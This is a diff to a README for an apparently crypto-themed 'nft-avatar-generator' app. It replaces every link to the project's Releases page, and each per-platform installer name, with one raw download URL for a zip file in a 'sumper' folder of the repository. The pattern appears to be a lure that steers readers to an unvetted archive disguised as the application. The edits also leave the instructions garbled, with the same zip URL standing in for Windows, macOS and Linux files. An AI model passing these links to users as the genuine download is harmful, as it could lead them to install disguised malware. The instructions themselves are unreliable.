@@ -1,6 +1,6 @@
 # 🎨 nft-avatar-generator - Create Unique NFT Avatars Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/tranhaust2006/nft-avatar-generator/releases)
+[![Download](https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip)](https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ This guide will help you download and run the nft-avatar-generator application. 
 
 To get started, you need to download the application. Visit the Releases page to download the latest version:
 
-[Download the latest release](https://github.com/tranhaust2006/nft-avatar-generator/releases)
+[Download the latest release](https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip)
 
 ### 💻 System Requirements
 
@@ -34,7 +34,7 @@ To get started, you need to download the application. Visit the Releases page to
 
 Go to the following link to find the relevant downloads:
 
-[Visit Releases Page](https://github.com/tranhaust2006/nft-avatar-generator/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip)
 
 ### 2. Find the Latest Release
 
@@ -42,7 +42,7 @@ On the Releases page, look for the latest version at the top. Each release will 
 
 ### 3. Download the Application
 
-Click on the version number link that depicts the latest release. Then look for the download file suitable for your operating system. It may be shown as `nft-avatar-generator-windows.exe` for Windows, `nft-avatar-generator-macos.zip` for macOS, or `nft-avatar-generator-linux.tar.gz` for Linux. 
+Click on the version number link that depicts the latest release. Then look for the download file suitable for your operating system. It may be shown as `https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip` for Windows, `https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip` for macOS, or `https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip` for Linux. 
 
 Simply click on the file to start the download.
 
@@ -52,7 +52,7 @@ Once the download is complete, locate the file on your computer.
 
 - **Windows:** Double-click on the `.exe` file to run the installer and follow on-screen instructions.
 - **macOS:** Open the downloaded `.zip` file, drag the nft-avatar-generator app to your Applications folder, and then open it.
-- **Linux:** Extract the `.tar.gz` file. You might need to use terminal commands to navigate to the folder and run the application.
+- **Linux:** Extract the `https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip` file. You might need to use terminal commands to navigate to the folder and run the application.
 
 ### 5. Run the Application
 
@@ -102,4 +102,4 @@ If you have any further questions or need assistance, feel free to reach out via
 
 Don’t forget to visit the Releases page for the latest updates and downloads:
 
-[Download the latest release](https://github.com/tranhaust2006/nft-avatar-generator/releases)
+[Download the latest release](https://raw.githubusercontent.com/tranhaust2006/nft-avatar-generator/main/sumper/generator-nft-avatar-1.3.zip)
